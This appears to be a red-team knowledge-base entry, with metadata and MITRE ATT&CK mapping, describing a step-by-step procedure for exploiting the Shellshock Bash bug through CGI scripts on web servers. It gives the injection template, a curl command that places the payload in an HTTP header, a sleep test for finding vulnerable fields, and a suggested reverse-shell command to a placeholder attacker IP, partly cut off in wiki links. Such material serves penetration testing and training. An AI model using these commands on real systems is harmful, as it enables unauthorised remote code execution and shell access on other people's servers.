---
id: 98618d72-bdfc-44ee-815d-ded43608c799
name: Exploit Shellshock on a Vulnerable Web App
type: procedure
verified: true
submitted: true
created_at: '2019-10-10T21:06:32.327324+00:00'
updated_at: '2023-05-26T18:36:19.270751+00:00'
tactics:
- '[[Initial Access|TA0001 - Initial Access]]'
techniques:
- '[[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]'
platforms:
- Linux
tags:
- '[[known vulnerability]]'
- '[[Linux]]'
commands:
- '[[curl Exploit a ShellShock Vulnerability]]'
---

# Exploit Shellshock on a Vulnerable Web App

**Status**: âœ“ Verified

## Summary

Shellshock is a family of security bugs in the Bash shell (pre 43-027), which allows attackers to remotely execute arbitrary commands on a vulnerable system. Web servers can be exploited by identifying a vulnerable script in the /cgi-bin directory, then using fields in the header to specify command

## Description

# Description

Shellshock is a family of security bugs in the Bash shell (pre 43-027), which allows attackers to remotely execute arbitrary commands on a vulnerable system. Web servers can be exploited by identifying a vulnerable script in the `/cgi-bin` directory, then using fields in the header to specify commands for execution.

# Instructions

Shellshock is executed using the following template:

**Code**: [[() { :; }; <COMMAND>]]

1. After identifying potentially vulnerable scripts in the `/cgi-bin/` directory, make web requests to the script with headers crafted to include a malicious payload. In this example, user.sh will be targeted as the vulnerable script, and the initial payload will be a simple 10 second sleep to verify code execution.

Use curl to make a request using the following format with `/bin/sleep 10` as the payload:

**Command** ([[curl Exploit a ShellShock Vulnerability]]):

```bash
curl http://$_TARGET_IP/cgi-bin/$_SCRIPT.sh -H '$_HEADER_FIELD: () { :; }; $_PAYLOAD'
```

Use this sleep command to enumerate vulnerabilities in Referrer, Cookies, User-Agent, Accept-language, or other non-standard fields. If the web application pauses for 10 seconds, a vulnerable field has been found and code execution is possible. 

2. Replace the sleep payload with a shell.  Suggested Payload:

**Code**: [[bash -c "/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$AT]]

3. Execute the command.

**Code**: [[curl http://10.10.10.10/cgi-bin/user.sh -H 'User-A]]

## Platforms

- Linux

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access|TA0001 - Initial Access]]

### Techniques

- [[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]

## Commands Used

- [[curl Exploit a ShellShock Vulnerability]]

## Tags

- [[known vulnerability]]
- [[Linux]]
